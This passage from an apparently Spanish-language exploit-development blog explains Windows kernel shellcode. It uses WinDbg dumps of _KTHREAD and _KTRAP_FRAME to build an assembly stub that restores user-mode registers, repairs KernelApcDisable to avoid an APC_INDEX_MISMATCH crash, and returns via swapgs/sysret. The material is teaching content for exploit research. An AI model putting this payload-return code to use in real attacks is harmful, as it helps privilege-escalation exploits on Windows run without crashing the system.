<code><span class="ro">0: kd></span><span class="p"> dqs gs:0x188 L1
002b:00000000`00000188  ffffb68c`7dddc080

</span><span class="ro">0: kd></span><span class="p"> dt nt!_KTHREAD 0xffffb68c7dddc080
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x7a1c381
   +0x028 InitialStack     : 0xffff8503`c6614c90 Void
   +0x030 StackLimit       : 0xffff8503`c660f000 Void
   +0x038 StackBase        : 0xffff8503`c6615000 Void
   ..................................................
   +0x080 SystemCallNumber : 7
   +0x084 ReadyTime        : 9
   +0x088 FirstArgument    : 0x00000000`00000094 Void
   +0x090 TrapFrame        : 0xffff8503`c6614b00 _KTRAP_FRAME</span>
</code></pre></div></div><br>

<p class="plain-text">En esta estructura podemos encontrar los registros guardados de modo usuario, necesitamos restaurar varios de ellos que no se consideran <a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-160">volátiles</a>, para ello nos guiaremos de la <a href="https://www.felixcloutier.com/x86/sysret">documentación</a> donde nos dice que registros deben contener que valores, por ejemplo que <code class="language-plaintext highlighter-rouge">r11</code> debe contener las <code class="language-plaintext highlighter-rouge">rflags</code> o <code class="language-plaintext highlighter-rouge">rcx</code> el valor de <code class="language-plaintext highlighter-rouge">rip</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd> </span><span class="p">dt nt!_KTRAP_FRAME 0xffff8503c6614b00
   +0x000 P1Home           : 0xffffb68c`7dddc080
   +0x008 P2Home           : 0x10
   +0x010 P3Home           : 0xffff8503`00000000
   +0x018 P4Home           : 0xffffb68c`00000000
   .............................................
   +0x140 Rbx              : 0
   +0x148 Rdi              : 0x94
   +0x150 Rsi              : 0x000001ae`845b0000
   +0x158 Rbp              : 0x94
   +0x160 ErrorCode        : 4
   +0x160 ExceptionFrame   : 4
   +0x168 Rip              : 0x00007ff8`728ed0c4
   +0x170 SegCs            : 0x33
   +0x172 Fill0            : 0 ''
   +0x173 Logging          : 0 ''
   +0x174 Fill1            : [2] 0
   +0x178 EFlags           : 0x246
   +0x17c Fill2            : 0
   +0x180 Rsp              : 0x00000083`ed55fb98</span>
</code></pre></div></div><br>

<p class="plain-text">Con lo que sabemos ahora podemos simplemente restaurar los registros desde la estructura <code class="language-plaintext highlighter-rouge">TrapFrame</code> a como nos conviene para posteriormente intercambiar el segmento <code class="language-plaintext highlighter-rouge">gs</code> y ejecutar el <code class="language-plaintext highlighter-rouge">sysret</code> para volver al modo de usuario, no sin antes establecer el valor de retorno en <code class="language-plaintext highlighter-rouge">rax</code> a <code class="language-plaintext highlighter-rouge">0</code> indicado que ha vuelto correctamente.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="c1">.................kernel shellcode.................

    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD

    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x90</span><span class="p">]</span><span class="c1">            ; $rdx = ETHREAD.TrapFrame
    </span><span class="o">mov</span><span class="mi"> rbp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x158</span><span class="p">]</span><span class="c1">           ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x168</span><span class="p">]</span><span class="c1">           ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="o">mov</span><span class="mi"> r11</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x178</span><span class="p">]</span><span class="c1">           ; $r11 = ETHREAD.TrapFrame.EFlags
    </span><span class="o">mov</span><span class="mi"> rsp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x180</span><span class="p">]</span><span class="c1">           ; $rsp = ETHREAD.TrapFrame.Rsp

    </span><span class="o">xor</span><span class="mi"> rax</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                     ; $rax = STATUS SUCCESS
    </span><span class="o">swapgs</span><span class="c1">                           ; swap gs segment
    </span><span class="o">o64 sysret</span><span class="c1">                       ; return to usermode</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo al intentar usar este shellcode nos devuelve un BSOD ocasionado por el error <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x1--apc-index-mismatch">APC_INDEX_MISMATCH</a>, la documentación nos dice que esto se debe a que <code class="language-plaintext highlighter-rouge">KeEnterCriticalRegion</code> debe tener una llamada coincidente a <code class="language-plaintext highlighter-rouge">KeLeaveCriticalRegion</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> g
KDTARGET: Refreshing KD connection
*** Fatal System Error: 0x00000001 (0x00007FFBD644F8B4,0x0000000000000000,0x000000000000FFFF,0xFFFFDB0487C53B80)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

For analysis of this file, run !analyze -v
nt!DbgBreakPointWithStatus:
fffff806`34c073f0 cc              int     3

</span><span class="ro">0: kd></span><span class="p"> !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

APC_INDEX_MISMATCH (1)
This is a kernel internal error. The most common reason to see this BugCheck is when a filesystem or a driver has a mismatched number of calls to disable and re-enable APCs. The key data item is the Thread->CombinedApcDisable field. This consists of two separate 16-bit fields, the SpecialApcDisable and the KernelApcDisable. A negative value of either indicates that a driver has disabled special or normal APCs (respectively) without re-enabling them; a positive value indicates that a driver has enabled special or normal APCs (respectively) too many times.
Arguments:
Arg1: 00007ffbd644f8b4, Address of system call function or worker routine
Arg2: 0000000000000000, Thread->ApcStateIndex
Arg3: 000000000000ffff, (Thread->SpecialApcDisable << 16) | Thread->KernelApcDisable
Arg4: ffffdb0487c53b80, Call type (0 - system call, 1 - worker routine)</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-kernel/kernel-shellcode/5.png" target="_blank"><div><p><img src="/exploit-development/windows-kernel/kernel-shellcode/5.png"></p></div></a>

<p class="plain-text">Accediendo a la estructura <code class="language-plaintext highlighter-rouge">KTHREAD</code> en el offset <code class="language-plaintext highlighter-rouge">0x1e4</code> podemos ver que el valor en ejecución es de <code class="language-plaintext highlighter-rouge">-1</code>, la solución es simplemente limpiar <code class="language-plaintext highlighter-rouge">KernelApcDisable</code> estableciéndolo a <code class="language-plaintext highlighter-rouge">0</code> por lo que solo debemos aumentarle su valor en una unidad.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> dqs gs:0x188 L1
002b:00000000`00000188  ffffb081`1abed080

</span><span class="ro">0: kd></span><span class="p"> dt nt!_KTHREAD 0xffffb0811abed080
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 SListFaultAddress : (null) 
   +0x020 QuantumTarget    : 0x769b263
   +0x028 InitialStack     : 0xffff9084`eab77c90 Void
   +0x030 StackLimit       : 0xffff9084`eab72000 Void
   +0x038 StackBase        : 0xffff9084`eab78000 Void
   ..................................................
   +0x1e4 KernelApcDisable : 0n-1
   +0x1e6 SpecialApcDisable : 0n0
   +0x1e4 CombinedApcDisable : 0xffff</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces desde nuestro shellcode podemos simplemente obtener el valor actual de <code class="language-plaintext highlighter-rouge">KernelApcDisable</code>, incrementar su valor en una unidad y restaurarlo de nuevo.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov</span><span class="mi"> cx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">]</span><span class="c1">            ; $cx = KernelApcDisable
    </span><span class="o">inc</span><span class="mi"> cx</span><span class="c1">                           ; fix value
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">],</span><span class="mi"> cx</span><span class="c1">            ; restore value</span>
</code></pre></div></div><br>

<p class="plain-text">Entonces resumiendo el shellcode de retorno con <code class="language-plaintext highlighter-rouge">sysret</code> luego de ejecutar un shellcode restaura los valores a través del <code class="language-plaintext highlighter-rouge">TrapFrame</code> y vuelve a modo de usuario.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="c1">.................kernel shellcode.................

    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">gs</span><span class="p">:</span><span class="mi">0x188</span><span class="p">]              </span><span class="c1">; $rdx = _KTHREAD

    </span><span class="o">mov</span><span class="mi"> cx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">]</span><span class="c1">            ; $cx = KernelApcDisable
    </span><span class="o">inc</span><span class="mi"> cx</span><span class="c1">                           ; fix value
    </span><span class="o">mov</span><span class="p"> [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x1e4</span><span class="p">],</span><span class="mi"> cx</span><span class="c1">            ; restore value  

    </span><span class="o">mov</span><span class="mi"> rdx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x90</span><span class="p">]</span><span class="c1">            ; $rdx = ETHREAD.TrapFrame
    </span><span class="o">mov</span><span class="mi"> rbp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x158</span><span class="p">]</span><span class="c1">           ; $rbp = ETHREAD.TrapFrame.Rbp
    </span><span class="o">mov</span><span class="mi"> rcx</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x168</span><span class="p">]</span><span class="c1">           ; $rcx = ETHREAD.TrapFrame.Rip
    </span><span class="o">mov</span><span class="mi"> r11</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x178</span><span class="p">]</span><span class="c1">           ; $r11 = ETHREAD.TrapFrame.EFlags
    </span><span class="o">mov</span><span class="mi"> rsp</span><span class="p">, [</span><span class="mi">rdx</span><span class="o"> +</span><span class="mi"> 0x180</span><span class="p">]</span><span class="c1">           ; $rsp = ETHREAD.TrapFrame.Rsp

    </span><span class="o">xor</span><span class="mi"> rax</span><span class="p">,</span><span class="mi"> rax</span><span class="c1">                     ; $rax = STATUS SUCCESS
    </span><span class="o">swapgs</span><span class="c1">                           ; swap gs segment
    </span><span class="o">o64 sysret</span><span class="c1">                       ; return to usermode</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
